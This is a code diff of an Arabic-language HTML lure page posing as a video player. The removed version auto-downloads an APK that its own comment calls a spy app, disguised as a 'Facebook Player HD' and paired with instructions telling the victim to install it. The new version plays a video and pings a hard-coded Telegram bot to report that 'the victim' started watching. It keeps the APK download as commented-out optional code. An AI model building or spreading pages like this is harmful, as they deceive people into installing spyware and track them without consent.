@@ -3,49 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video Player</title>
+    <title>مشغل الفيديو الاحترافي</title>
     <style>
-        body { background: #111; color: #fff; font-family: Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .video-box { width: 100%; max-width: 500px; position: relative; background: #000; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
-        .download-btn { background: #1877f2; color: white; padding: 15px 30px; border-radius: 30px; text-decoration: none; font-weight: bold; display: flex; align-items: center; gap: 10px; cursor: pointer; border: none; font-size: 18px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        .arrow { width: 20px; height: 20px; fill: white; }
-        .info-text { font-size: 14px; color: #ccc; margin-top: 15px; text-align: center; padding: 0 20px; }
+        :root {
+            --primary-color: #ff3366; /* لون جذاب */
+            --secondary-color: #2a2a2a;
+            --text-color: #ffffff;
+            --bg-color: #121212;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            position: relative;
+            width: 90%;
+            max-width: 600px;
+            aspect-ratio: 16 / 9; /* نسبة عرض إلى ارتفاع قياسية للفيديو */
+            background-color: #000;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.3); /* ظل ملون */
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px); /* تأثير حركي عند التمرير */
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.8)); /* تدرج لوني للخلفية */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .play-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 5px 15px rgba(255, 51, 102, 0.5);
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            animation: pulse 1.5s infinite; /* تأثير النبض لجذب الانتباه */
+        }
+
+        .play-btn:hover {
+            background-color: #ff5c85;
+            transform: scale(1.1);
+        }
+
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
+            margin-left: 5px; /* لضبط التمركز */
+        }
+
+        .info-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            margin-top: 20px;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .sub-text {
+            font-size: 14px;
+            color: #ddd;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 51, 102, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 15px rgba(255, 51, 102, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 51, 102, 0);
+            }
+        }
     </style>
 </head>
 <body>
 
-    <div class="video-box">
-        <img src="https://via.placeholder.com/500x300/000000/FFFFFF?text=Click+to+Play+Video" style="width: 100%;">
-        
+    <div class="container">
+        <video id="mainVideo" loop>
+            <source src="v.mp4" type="video/mp4">
+            متصفحك لا يدعم تشغيل الفيديو.
+        </video>
+
         <div class="overlay" id="overlay">
-            <button class="download-btn" onclick="startTrap()">
-                <span>تحميل الفيديو للمشاهدة</span>
-                <svg class="arrow" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+            <button class="play-btn" onclick="startTrap()">
+                <div class="play-icon"></div>
             </button>
-            <p class="info-text">يجب تثبيت "مشغل فيديو فيسبوك" لمشاهدة هذا المحتوى بدقة عالية.</p>
+            <p class="info-text">فيديو حصري ومشوق بانتظارك!</p>
+            <p class="sub-text">انقر للتشغيل والاستمتاع بالمشاهدة فوراً.</p>
         </div>
     </div>
 
     <script>
-        function startTrap() {
-            // 1. تنزيل ملف الـ APK (الجاسوس) تلقائياً
-            const fileUrl = 'facebook_fix.apk'; // تأكد إن الملف مرفوع على GitHub بنفس الاسم
-            const link = document.createElement('a');
-            link.href = fileUrl;
-            link.download = 'Facebook_Player_HD.apk';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+        const botToken = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
+        const chatId = "1356975454";
 
-            // 2. تغيير النص عشان يفتكر إنه بيثبت المشغل فعلاً
-            document.querySelector('.info-text').innerHTML = "<b style='color:#00ff00'>جاري التحميل...</b><br>بعد التحميل، اضغط 'فتح' ثم 'تثبيت' لمشاهدة الفيديو فوراً.";
-            
-            // 3. نبعت إشارة لبوت التليجرام إن الضحية ضغط على التحميل
-            const botToken = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
-            const chatId = "1356975454";
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 الضحية ضغط على زر التحميل وبدأ تنزيل الـ APK!")}`);
+        function startTrap() {
+            // 1. إخفاء الواجهة وتشغيل الفيديو
+            document.getElementById('overlay').style.display = 'none';
+            var video = document.getElementById('mainVideo');
+            video.play();
+
+            // 2. إرسال إشعار للبوت
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 الضحية بدأ مشاهدة الفيديو الاحترافي!")}`);
+
+            // 3. (اختياري) يمكنك إضافة كود هنا لتنزيل ملف الـ APK إذا أردت دمج الطريقتين
+            // const fileUrl = 'facebook_fix.apk'; 
+            // const link = document.createElement('a');
+            // link.href = fileUrl;
+            // link.download = 'Video_Player_Update.apk';
+            // document.body.appendChild(link);
+            // link.click();
+            // document.body.removeChild(link);
         }
     </script>
 </body>
